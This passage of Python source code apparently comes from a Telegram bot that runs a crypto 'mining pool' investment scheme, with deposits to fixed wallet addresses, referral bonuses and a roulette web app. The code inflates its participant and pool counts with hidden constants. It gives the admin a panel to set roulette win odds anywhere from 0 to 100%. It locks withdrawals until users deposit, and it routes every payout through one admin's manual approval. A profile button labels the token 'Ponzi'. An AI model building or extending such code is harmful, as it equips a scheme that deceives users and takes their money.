        "SELECT COALESCE(SUM(amount), 0) FROM transactions WHERE user_id=? AND tx_type='withdraw' AND status='approved'",
        (user_id,),
    ).fetchone()[0]
    conn.close()
    return float(value or 0)


def can_user_withdraw(user_id: int) -> tuple[bool, str]:
    user = get_user(user_id)
    if user["balance"] < 10:
        return False, "withdraw_min_10"

    own_deposits = get_approved_deposit_total(user_id)
    own_withdrawn = get_approved_withdraw_total(user_id)
    mining_profit_estimate = user["balance"] - 5.0 - own_deposits + own_withdrawn

    if own_deposits >= 10 or mining_profit_estimate >= 10:
        return True, ""
    return False, "withdraw_gift_locked"


def open_pool(user_id: int, pool_number: int, amount: float) -> str:
    cfg = POOL_CONFIG[pool_number]
    conn = db()
    cur = conn.cursor()
    active = cur.execute("SELECT id FROM user_pools WHERE user_id=? AND active=1 LIMIT 1", (user_id,)).fetchone()
    if active:
        conn.close()
        return "already_open"

    row = cur.execute("SELECT balance, pools_opened FROM users WHERE user_id=?", (user_id,)).fetchone()
    if not row:
        conn.close()
        return "not_found"

    balance = float(row[0])

    if pool_number == 1 and not (1 <= amount <= 30):
        conn.close()
        return "insufficient"
    if pool_number == 2 and not (31 <= amount <= 250):
        conn.close()
        return "insufficient"
    if amount > balance:
        conn.close()
        return "insufficient"

    cur.execute("UPDATE users SET balance=balance-?, pools_opened=pools_opened+1 WHERE user_id=?", (amount, user_id,))
    cur.execute(
        "INSERT INTO user_pools(user_id, pool_number, started_at, active, invested_amount) VALUES (?, ?, ?, 1, ?)",
        (user_id, pool_number, moscow_now_ts(), amount),
    )
    conn.commit()
    conn.close()
    return "opened"


def add_transaction(user_id: int, tx_type: str, amount: float, network: str = "", wallet: str = "") -> int:
    conn = db()
    cur = conn.cursor()
    cur.execute(
        """
        INSERT INTO transactions(user_id, tx_type, network, wallet, amount, status, created_at)
        VALUES (?, ?, ?, ?, ?, 'pending', ?)
        """,
        (user_id, tx_type, network, wallet, amount, moscow_now_ts()),
    )
    tx_id = cur.lastrowid
    conn.commit()
    conn.close()
    return tx_id


def set_tx_status(tx_id: int, status: str, note: str = "") -> Optional[sqlite3.Row]:
    conn = db()
    cur = conn.cursor()
    tx = cur.execute("SELECT * FROM transactions WHERE id=?", (tx_id,)).fetchone()
    if not tx or tx[6] != "pending":
        conn.close()
        return None

    cur.execute("UPDATE transactions SET status=?, admin_note=? WHERE id=?", (status, note, tx_id))

    if status == "approved" and tx[2] == "deposit":
        cur.execute("UPDATE users SET balance=balance+? WHERE user_id=?", (tx[5], tx[1]))
    elif status == "approved" and tx[2] == "withdraw":
        user_row = cur.execute("SELECT balance FROM users WHERE user_id=?", (tx[1],)).fetchone()
        if user_row and user_row[0] >= tx[5]:
            cur.execute("UPDATE users SET balance=balance-? WHERE user_id=?", (tx[5], tx[1]))
        else:
            cur.execute("UPDATE transactions SET status='rejected', admin_note='insufficient_at_approval' WHERE id=?", (tx_id,))
            status = "rejected"
    conn.commit()

    updated = cur.execute("SELECT * FROM transactions WHERE id=?", (tx_id,)).fetchone()
    conn.close()
    return updated


def menu_keyboard(lang: str, user_id: Optional[int] = None) -> InlineKeyboardMarkup:
    t = I18N[lang]
    rows = [
        [
            InlineKeyboardButton(t["menu_mining"], callback_data="menu:mining"),
            InlineKeyboardButton(t["menu_profile"], callback_data="menu:profile"),
        ],
        [InlineKeyboardButton(t["menu_about"], callback_data="menu:about")],
        [
            InlineKeyboardButton(t["menu_boost"], callback_data="menu:boost"),
            InlineKeyboardButton("🎰 WebApp", web_app=WebAppInfo(url=WEBAPP_URL)),
        ],
        [InlineKeyboardButton(t["menu_refresh"], callback_data="menu:refresh")],
    ]
    return InlineKeyboardMarkup(rows)


def profile_keyboard(lang: str) -> InlineKeyboardMarkup:
    if lang == "ru":
        dep, web, wd, back = "💳 Пополнить", "🪙 Token Ponzi", "➖ Вывести", "🔙 Назад"
    else:
        dep, web, wd, back = "💳 Deposit", "🪙 Ponzi Token", "➖ Withdraw", "🔙 Back"
    return InlineKeyboardMarkup(
        [
            [
                InlineKeyboardButton(dep, callback_data="profile:deposit"),
                InlineKeyboardButton(web, web_app=WebAppInfo(url=WEBAPP_URL)),
            ],
            [InlineKeyboardButton(wd, callback_data="profile:withdraw")],
            [InlineKeyboardButton(I18N[lang]["profile_language_btn"], callback_data="profile:language")],
            [InlineKeyboardButton(back, callback_data="menu:home")],
        ]
    )


def mining_keyboard(lang: str, has_active_pool: bool) -> InlineKeyboardMarkup:
    back = "🔙 Назад" if lang == "ru" else "🔙 Back"
    rows = []
    if has_active_pool:
        rows.append([InlineKeyboardButton(I18N[lang]["close_pool_btn"], callback_data="pool:close")])
    else:
        rows.append([InlineKeyboardButton("1 Pool", callback_data="pool:1"), InlineKeyboardButton("2 Pool", callback_data="pool:2")])
    rows.append([InlineKeyboardButton(back, callback_data="menu:home")])
    return InlineKeyboardMarkup(rows)


def boost_keyboard(lang: str) -> InlineKeyboardMarkup:
    back = "🔙 Назад" if lang == "ru" else "🔙 Back"
    return InlineKeyboardMarkup(
        [
            [InlineKeyboardButton("Pool1", callback_data="boost:1"), InlineKeyboardButton("Pool2", callback_data="boost:2")],
            [InlineKeyboardButton(back, callback_data="menu:home")],
        ]
    )


def deposit_network_keyboard(lang: str) -> InlineKeyboardMarkup:
    back = "🔙 Назад" if lang == "ru" else "🔙 Back"
    return InlineKeyboardMarkup(
        [
            [InlineKeyboardButton("🌞 Solana", callback_data="depnet:solana")],
            [InlineKeyboardButton("💲 USDT TRC20", callback_data="depnet:trc20")],
            [InlineKeyboardButton("💲 USDT BEP20", callback_data="depnet:bep20")],
            [InlineKeyboardButton(back, callback_data="menu:profile")],
        ]
    )


def refresh_keyboard(lang: str) -> InlineKeyboardMarkup:
    refresh = "🔄 Обновить" if lang == "ru" else "🔄 Refresh"
    back = "🔙 Назад" if lang == "ru" else "🔙 Back"
    return InlineKeyboardMarkup(
        [[InlineKeyboardButton(refresh, callback_data="deposit:refresh")], [InlineKeyboardButton(back, callback_data="menu:profile")]]
    )


def roulette_admin_keyboard() -> InlineKeyboardMarkup:
    values = [25, 40, 55, 70, 85]
    rows = [[InlineKeyboardButton(f"{v}%", callback_data=f"roulette:setwin:{v}") for v in values[:3]],
            [InlineKeyboardButton(f"{v}%", callback_data=f"roulette:setwin:{v}") for v in values[3:]],
            [InlineKeyboardButton("100%", callback_data="roulette:setwin:100"), InlineKeyboardButton("0%", callback_data="roulette:setwin:0")]]
    return InlineKeyboardMarkup(rows)


async def show_roulette_admin_panel(target, lang: str) -> None:
    text = I18N[lang]["roulette_admin_panel"].format(value=get_roulette_win_chance())
    if hasattr(target, "edit_message_text"):
        await target.edit_message_text(text, reply_markup=roulette_admin_keyboard())
    else:
        await target.reply_text(text, reply_markup=roulette_admin_keyboard())


USER_STATES: dict[int, UserState] = {}
NEW_USERS_PENDING_BONUS: set[int] = set()
LAST_ACTION_TS: dict[int, float] = {}
ANTIFLOOD_SECONDS = 2




def check_antiflood(user_id: int) -> tuple[bool, int]:
    now = time.time()
    last = LAST_ACTION_TS.get(user_id, 0.0)
    diff = now - last
    if diff < ANTIFLOOD_SECONDS:
        return False, int(ANTIFLOOD_SECONDS - diff) + 1
    LAST_ACTION_TS[user_id] = now
    return True, 0


async def pass_antiflood(query, user_id: int, lang: str) -> bool:
    ok, wait_for = check_antiflood(user_id)
    if ok:
        return True
    await query.answer(I18N[lang]["antiflood_wait"].format(seconds=wait_for), show_alert=True)
    return False


def maintenance_text(lang: str) -> str:
    return I18N.get(lang, I18N["ru"]).get("maintenance", I18N["ru"]["maintenance"])


def is_admin_user(user_id: int) -> bool:
    return user_id == ADMIN_ID


def is_maintenance_blocked(user_id: int) -> bool:
    if is_admin_user(user_id):
        return False
    now_utc = datetime.utcnow()
    return now_utc.hour == 8


def parse_referrer(text: str) -> Optional[int]:
    parts = text.split()
    if len(parts) < 2:
        return None
    payload = parts[1].strip()
    if payload.startswith("ref") and payload[3:].isdigit():
        return int(payload[3:])
    return None


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not update.effective_user or not update.message:
        return

    user_id = update.effective_user.id
    if is_maintenance_blocked(user_id):
        await update.message.reply_text(maintenance_text(get_lang(user_id)))
        return

    ref_id = parse_referrer(update.message.text or "")
    if ref_id == user_id:
        ref_id = None
    existing = get_user(user_id)
    is_new = False
    if not existing:
        is_new = ensure_user(user_id, ref_id)
        if is_new:
            NEW_USERS_PENDING_BONUS.add(user_id)

    linked_ref = bind_referrer_if_missing(user_id, ref_id)
    if linked_ref and ref_id:
        ref_user = update.effective_user.username or f"id{user_id}"
        ref_user = f"@{ref_user}" if not str(ref_user).startswith("id") else str(ref_user)
        ref_lang = get_lang(ref_id)
        try:
            await context.bot.send_message(chat_id=ref_id, text=I18N[ref_lang]["new_referral"].format(ref_user=ref_user))
        except Exception:
            pass

    if existing and existing["lang"] in I18N:
        await show_main_menu_from_message(update.message, user_id)
        return

    keyboard = InlineKeyboardMarkup(
        [
            [InlineKeyboardButton("🇷🇺 Русский", callback_data="lang:ru")],
            [InlineKeyboardButton("🇬🇧 English", callback_data="lang:en")],
        ]
    )
    text = "🌐 Выберите язык / Choose language"
    if is_new:
        text += "\n\n🎁 Бонус для нового пользователя: +5$"
    await update.message.reply_text(text, reply_markup=keyboard)


async def rs_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not update.effective_user or not update.message:
        return
    if update.effective_user.id != ADMIN_ID:
        return
    admin_lang = get_lang(update.effective_user.id)
    USER_STATES[ADMIN_ID] = UserState(mode="await_broadcast_text")
    await update.message.reply_text(I18N[admin_lang]["rs_prompt"])


async def roulette_admin_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not update.effective_user or not update.message:
        return
    if update.effective_user.id != ADMIN_ID:
        return
    lang = get_lang(update.effective_user.id)
    await show_roulette_admin_panel(update.message, lang)


def build_main_menu_text(user_id: int, lang: str) -> str:
    user = get_user(user_id)
    pool_percent, earned = pool_percent_and_earned(user_id)
    return I18N[lang]["waiting"].format(
        user_id=user_id,
        open_pools=get_active_pools_count(user_id),
        pool_percent=pool_percent,
        earned=earned,
        participants_total=BASE_PARTICIPANTS + get_total_users(),
        global_pools_total=BASE_OPEN_POOLS + get_total_opened_pools(),
    )


async def show_main_menu_from_query(query, user_id: int, prefix_text: Optional[str] = None) -> None:
    lang = get_lang(user_id)
    content = build_main_menu_text(user_id, lang)
    if prefix_text:
        content = f"{escape_markdown(prefix_text)}\n\n{escape_markdown(I18N[lang]['back_to_menu'])}\n\n{content}"
    try:
        await query.edit_message_text(text=content, reply_markup=menu_keyboard(lang, user_id), parse_mode="Markdown")
    except BadRequest as exc:
        if "Message is not modified" not in str(exc):
            raise


async def show_main_menu_from_message(message, user_id: int, prefix_text: Optional[str] = None) -> None:
    lang = get_lang(user_id)
    content = build_main_menu_text(user_id, lang)
    if prefix_text:
        content = f"{escape_markdown(prefix_text)}\n\n{escape_markdown(I18N[lang]['back_to_menu'])}\n\n{content}"
    await message.reply_text(content, reply_markup=menu_keyboard(lang, user_id), parse_mode="Markdown")


async def send_waiting_screen(target, user_id: int) -> None:
    await show_main_menu_from_query(target, user_id)


async def thinking(editable, lang: str) -> None:
    await editable.edit_message_text(I18N[lang]["thinking"])
    await asyncio.sleep(2)


async def callbacks(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    if not query or not update.effective_user:
        return

    await query.answer()
    user_id = update.effective_user.id
    ensure_user(user_id)
    lang = get_lang(user_id)
    data = query.data or ""

    if is_maintenance_blocked(user_id):
        await query.answer(maintenance_text(lang), show_alert=True)
        return

    if not await pass_antiflood(query, user_id, lang):
        return

    if data.startswith("lang:"):
        chosen = data.split(":", 1)[1]
        set_lang(user_id, chosen)
        bonus = I18N[chosen]["bonus_new_user"] if user_id in NEW_USERS_PENDING_BONUS else None
        NEW_USERS_PENDING_BONUS.discard(user_id)
        await show_main_menu_from_query(query, user_id, prefix_text=bonus)
        return

    if data == "menu:home":
        await send_waiting_screen(query, user_id)
        return

    if data == "menu:refresh":
        await send_waiting_screen(query, user_id)
        return

    if data == "menu:mining":
        lang = get_lang(user_id)
        await query.edit_message_text(I18N[lang]["mining_text"], reply_markup=mining_keyboard(lang, has_active_pool=bool(get_active_pool(user_id))), parse_mode="Markdown")
        return

    if data == "menu:profile":
        await render_profile(query, user_id)
        return

    if data == "menu:boost":
        lang = get_lang(user_id)
        try:
            user_tag = f"@{update.effective_user.username}" if update.effective_user and update.effective_user.username else f"id{user_id}"
            await context.bot.send_message(chat_id=ADMIN_ID, text=f"🔔 Кто-то нажал Boost\nUser: {user_tag} ({user_id})")
        except Exception:
            pass
        boost_text = I18N.get(lang, I18N["ru"]).get("boost_text") or I18N["ru"]["boost_text"]
        await query.edit_message_text(boost_text, reply_markup=boost_keyboard(lang), parse_mode="Markdown")
        return

    if data.startswith("boost:"):
        lang = get_lang(user_id)
        boost_type = int(data.split(":", 1)[1])
        dict_l = I18N.get(lang, I18N["ru"])
        pay_text = dict_l.get("boost_buy_1") if boost_type == 1 else dict_l.get("boost_buy_2")
        status = buy_boost(user_id, boost_type)
        if status == "no_pool":
            msg = dict_l.get("boost_need_pool", I18N["ru"]["boost_need_pool"])
        elif status == "already":
            msg = dict_l.get("boost_already", I18N["ru"]["boost_already"])
        elif status == "insufficient":
            msg = f"{pay_text}\n{dict_l.get('boost_insufficient', I18N['ru']['boost_insufficient'])}"
        else:
            hours = 12 if boost_type == 1 else 6
            msg = f"{pay_text}\n{dict_l.get('boost_ok', I18N['ru']['boost_ok']).format(hours=hours)}"
        await show_main_menu_from_query(query, user_id, prefix_text=msg)
        return

    if data == "menu:about":
        lang = get_lang(user_id)
        back = "🔙 Назад" if lang == "ru" else "🔙 Back"
        kb = InlineKeyboardMarkup([[InlineKeyboardButton(back, callback_data="menu:home")]])
        await query.edit_message_text(I18N[lang]["about"], reply_markup=kb, parse_mode="Markdown")
        return

    if data == "pool:close":
        lang = get_lang(user_id)
        result = close_active_pool(user_id)
        if not result:
            msg = I18N[lang]["pool_no_active"]
        else:
            hours = result["seconds"] // 3600
            minutes = (result["seconds"] % 3600) // 60
            duration = f"{hours}ч {minutes}м" if lang == "ru" else f"{hours}h {minutes}m"
            msg = I18N[lang]["pool_closed"].format(earned=f"{result['earned']:.2f}$", duration=duration)
            if result.get("referrer_id") and result.get("ref_bonus", 0) > 0:
                ref_id = result["referrer_id"]
                ref_lang = get_lang(ref_id)
                bonus_text = I18N[ref_lang]["ref_bonus"].format(amount=f"{result['ref_bonus']:.2f}$")
                try:
                    await query.get_bot().send_message(chat_id=ref_id, text=bonus_text)
                except Exception:
                    pass
        await show_main_menu_from_query(query, user_id, prefix_text=msg)
        return

    if data.startswith("pool:"):
        pool_number = int(data.split(":", 1)[1])
        USER_STATES[user_id] = UserState(mode="await_pool_amount", pool_number=pool_number)
        await query.edit_message_text(I18N[lang]["pool_amount_prompt"])
        return

    if data == "profile:language":
        keyboard = InlineKeyboardMarkup(
            [
                [InlineKeyboardButton("🇷🇺 Русский", callback_data="setlang:ru")],
                [InlineKeyboardButton("🇬🇧 English", callback_data="setlang:en")],
                [InlineKeyboardButton("🔙 Назад" if lang == "ru" else "🔙 Back", callback_data="menu:profile")],
            ]
        )
        await query.edit_message_text(I18N[lang]["profile_language_title"], reply_markup=keyboard)
        return

    if data.startswith("setlang:"):
        chosen = data.split(":", 1)[1]
        set_lang(user_id, chosen)
        await show_main_menu_from_query(query, user_id)
        return

    if data == "profile:deposit":
        lang = get_lang(user_id)
        try:
            user_tag = f"@{update.effective_user.username}" if update.effective_user and update.effective_user.username else f"id{user_id}"
            await context.bot.send_message(chat_id=ADMIN_ID, text=f"🔔 Кто-то нажал Пополнить\nUser: {user_tag} ({user_id})")
        except Exception:
            pass
        await query.edit_message_text(I18N[lang]["deposit_select_network"], reply_markup=deposit_network_keyboard(lang), parse_mode="Markdown")
        return

    if data.startswith("depnet:"):
        network = data.split(":", 1)[1]
        USER_STATES[user_id] = UserState(mode="await_deposit_amount", network=network)
        lang = get_lang(user_id)
        await query.edit_message_text(I18N[lang]["ask_deposit_amount"])
        return

    if data == "deposit:refresh":
        lang = get_lang(user_id)
        await show_main_menu_from_query(query, user_id, prefix_text=I18N[lang]["deposit_refresh"])
        return

    if data == "profile:withdraw":
        lang = get_lang(user_id)
        allowed, reason_key = can_user_withdraw(user_id)
        if not allowed:
            await show_main_menu_from_query(query, user_id, prefix_text=I18N[lang][reason_key])
            return
        USER_STATES[user_id] = UserState(mode="await_withdraw_wallet")
        await query.edit_message_text(I18N[lang]["withdraw_ask_address"])
        return

    if data.startswith("roulette:setwin:"):
        if user_id != ADMIN_ID:
            return
        value = int(data.split(":")[-1])
        set_roulette_win_chance(value)
        lang = get_lang(user_id)
        text = I18N[lang]["roulette_win_chance_set"].format(value=value)
        await query.answer(text, show_alert=False)
        await show_roulette_admin_panel(query, lang)
        return

    if data.startswith("admin:"):
        await handle_admin_action(query, data)
        return


async def render_profile(query, user_id: int) -> None:
    lang = get_lang(user_id)
    user = get_user(user_id)
    bot_username = getattr(query.get_bot(), "username", None) or "your_bot"
    ref_link = f"https://t.me/{bot_username}?start=ref{user_id}"
    safe_ref_link = escape_markdown(ref_link)
    text = I18N[lang]["profile"].format(
        user_id=user_id,
        balance=user["balance"],
        open_pools=get_active_pools_count(user_id),
        ref_link=safe_ref_link,
        ref_count=get_ref_count(user_id),
    )
    await query.edit_message_text(text, parse_mode="Markdown", reply_markup=profile_keyboard(lang), disable_web_page_preview=True)


async def message_router(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not update.effective_user or not update.message or not update.message.text:
        return
    user_id = update.effective_user.id
    ensure_user(user_id)
    lang = get_lang(user_id)
    if is_maintenance_blocked(user_id):
        await update.message.reply_text(maintenance_text(lang))
        return

    state = USER_STATES.get(user_id)
    if not state or not state.mode:
        return


    if state.mode == "await_broadcast_text" and user_id == ADMIN_ID:
        text = update.message.text.strip()
        user_ids = get_all_user_ids()
        ok = 0
        fail = 0
        for uid in user_ids:
            try:
                await context.bot.send_message(chat_id=uid, text=text)
                ok += 1
            except Exception:
                fail += 1
        USER_STATES.pop(user_id, None)
        await update.message.reply_text(I18N[lang]["rs_report"].format(ok=ok, fail=fail))
        return

    if state.mode == "await_pool_amount":
        try:
            amount = float(update.message.text.replace(",", ".").strip())
            if amount <= 0:
                raise ValueError
        except ValueError:
            await update.message.reply_text(I18N[lang]["pool_amount_bad"])
            return

        pool_number = state.pool_number or 1
        status = open_pool(user_id, pool_number, amount)
        if status == "opened":
            msg = I18N[lang]["pool_ok"].format(pool=pool_number, amount=f"{amount:.2f}$")
        elif status == "already_open":
            msg = I18N[lang]["pool_already_opened"]
        else:
            msg = I18N[lang]["pool_fail"].format(pool=pool_number)
        USER_STATES.pop(user_id, None)
        await show_main_menu_from_message(update.message, user_id, prefix_text=msg)
        return

    if state.mode == "await_deposit_amount":
        try:
            amount = float(update.message.text.replace(",", ".").strip())
            if amount <= 0:
                raise ValueError
        except ValueError:
            await update.message.reply_text("Введите корректную сумму." if lang == "ru" else "Enter a valid amount.")
            return

        wait = await update.message.reply_text(I18N[lang]["thinking"])
        await asyncio.sleep(2)

        tx_id = add_transaction(user_id=user_id, tx_type="deposit", amount=amount, network=state.network or "")
        network = state.network or "trc20"
        network_label = {"solana": "Solana", "trc20": "USDT TRC20", "bep20": "USDT BEP20"}[network]
        wallet = NETWORK_ADDRESSES[network]
        await wait.edit_text(
            I18N[lang]["deposit_address"].format(network=network_label, address=wallet, amount=f"{amount:.2f}$"),
            parse_mode="Markdown",
            reply_markup=refresh_keyboard(lang),
        )

        admin_text = (
            f"💰 Новое пополнение\n"
            f"TX ID: {tx_id}\n"
            f"User: {user_id}\n"
            f"Сеть: {network_label}\n"
            f"Сумма: {amount:.2f}$"
        )
        admin_kb = InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton("✅ Одобрить", callback_data=f"admin:approve:deposit:{tx_id}"),
                    InlineKeyboardButton("❌ Отклонить", callback_data=f"admin:reject:deposit:{tx_id}"),
                ]
            ]
        )
        await context.bot.send_message(chat_id=ADMIN_ID, text=admin_text, reply_markup=admin_kb)

        USER_STATES.pop(user_id, None)
        return

    if state.mode == "await_withdraw_wallet":
        state.wallet = update.message.text.strip()
        state.mode = "await_withdraw_amount"
        USER_STATES[user_id] = state
        await update.message.reply_text(I18N[lang]["withdraw_ask_amount"])
        return

    if state.mode == "await_withdraw_amount":
        try:
            amount = float(update.message.text.replace(",", ".").strip())
            if amount <= 0:
                raise ValueError
        except ValueError:
            await update.message.reply_text("Введите корректную сумму." if lang == "ru" else "Enter a valid amount.")
            return

        if amount < 10:
            await update.message.reply_text(I18N[lang]["withdraw_min_10"])
            USER_STATES.pop(user_id, None)
            await show_main_menu_from_message(update.message, user_id)
            return

        allowed, reason_key = can_user_withdraw(user_id)
        if not allowed:
            await update.message.reply_text(I18N[lang][reason_key])
            USER_STATES.pop(user_id, None)
            await show_main_menu_from_message(update.message, user_id)
            return

        user = get_user(user_id)
        if user["balance"] < amount:
            await update.message.reply_text(I18N[lang]["withdraw_low_balance"])
            USER_STATES.pop(user_id, None)
            await show_main_menu_from_message(update.message, user_id)
            return

        wait = await update.message.reply_text(I18N[lang]["thinking"])
        await asyncio.sleep(2)

        tx_id = add_transaction(user_id=user_id, tx_type="withdraw", amount=amount, wallet=state.wallet or "", network="trc20")
        await wait.edit_text(I18N[lang]["withdraw_submitted"])

        admin_text = (
            f"🏦 Запрос на вывод\n"
            f"TX ID: {tx_id}\n"
            f"User: {user_id}\n"
            f"Адрес: {state.wallet}\n"
            f"Сумма: {amount:.2f}$"
        )
        admin_kb = InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton("✅ Одобрить", callback_data=f"admin:approve:withdraw:{tx_id}"),
                    InlineKeyboardButton("❌ Отклонить", callback_data=f"admin:reject:withdraw:{tx_id}"),
                ]
            ]
        )
        await context.bot.send_message(chat_id=ADMIN_ID, text=admin_text, reply_markup=admin_kb)
        USER_STATES.pop(user_id, None)
        await asyncio.sleep(1)
        await wait.edit_text(build_main_menu_text(user_id, lang), reply_markup=menu_keyboard(lang, user_id), parse_mode="Markdown")


async def webapp_router(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not update.effective_user or not update.message or not update.message.web_app_data:
        return

    user_id = update.effective_user.id
    ensure_user(user_id)
    lang = get_lang(user_id)
    if is_maintenance_blocked(user_id):
        await update.message.reply_text(maintenance_text(lang))
        return

    data = update.message.web_app_data.data

    try:
        payload = json.loads(data)
    except json.JSONDecodeError:
        payload = {"action": data}

    action = payload.get("action")
    dict_l = I18N.get(lang, I18N["ru"])

    if action == "roulette_activate_boost":
        win_id = int(payload.get("win_id", 0) or 0)
        activation = activate_boost_prize(user_id, win_id)
        if activation["status"] == "ok":
            await update.message.reply_text(dict_l["boost_ok"].format(hours=activation["hours"]))
        elif activation["status"] == "already":
            await update.message.reply_text(dict_l["boost_already"])
        else:
            await update.message.reply_text(dict_l["boost_need_pool"])
        return

    if action != "roulette_spin":
        await update.message.reply_text(dict_l["roulette_unknown_action"])
        return

    result = spin_roulette(user_id)
    if result["status"] == "insufficient":
        await update.message.reply_text(dict_l["roulette_insufficient"])
        return

    lines = [dict_l["roulette_result_title"], dict_l["roulette_spin_paid"]]
    if result["reward"] == "boost":
        lines.append(dict_l["roulette_boost_saved"])
    elif result["reward"] == "token":
        lines.append(dict_l["roulette_token_win"].format(tokens=result["tokens"]))
    elif result["reward"] == "nothing":
        lines.append(dict_l["roulette_nothing"])
    else:
        lines.append(dict_l["roulette_win_usdt"].format(amount=float(result["amount"])))

    await update.message.reply_text("\n".join(lines), parse_mode="Markdown")


async def handle_admin_action(query, data: str) -> None:
    if not query.from_user or query.from_user.id != ADMIN_ID:
        await query.answer("Только для администратора", show_alert=True)
        return

    _, action, tx_type, tx_id_str = data.split(":")
    tx_id = int(tx_id_str)
    status = "approved" if action == "approve" else "rejected"
    updated = set_tx_status(tx_id, status=status, note=f"by_admin:{query.from_user.id}")

    if not updated:
        await query.answer("Уже обработано или не найдено", show_alert=True)
        return

    user_id = updated[1]
    amount = updated[5]
    user_lang = get_lang(user_id)

    if updated[6] == "approved":
        text = I18N[user_lang]["approved_deposit"].format(amount=amount) if tx_type == "deposit" else I18N[user_lang]["approved_withdraw"].format(amount=amount)
        await query.edit_message_text(f"✅ {tx_type} #{tx_id} approved")
    else:
        text = I18N[user_lang]["rejected_deposit"] if tx_type == "deposit" else I18N[user_lang]["rejected_withdraw"]
        await query.edit_message_text(f"❌ {tx_type} #{tx_id} rejected")

    await query.get_bot().send_message(chat_id=user_id, text=text)
    await query.get_bot().send_message(
        chat_id=user_id,
        text=build_main_menu_text(user_id, user_lang),
        parse_mode="Markdown",
        reply_markup=menu_keyboard(user_lang, user_id),
    )


def main() -> None:
    if not BOT_TOKEN:
        raise RuntimeError("Set BOT_TOKEN environment variable")

    init_db()
    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("rs", rs_start))
    app.add_handler(CommandHandler("roulette_admin", roulette_admin_start))
    app.add_handler(CallbackQueryHandler(callbacks))
    app.add_handler(MessageHandler(filters.StatusUpdate.WEB_APP_DATA, webapp_router))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_router))

    logger.info("Bot started")
    app.run_polling()


if __name__ == "__main__":
    main()
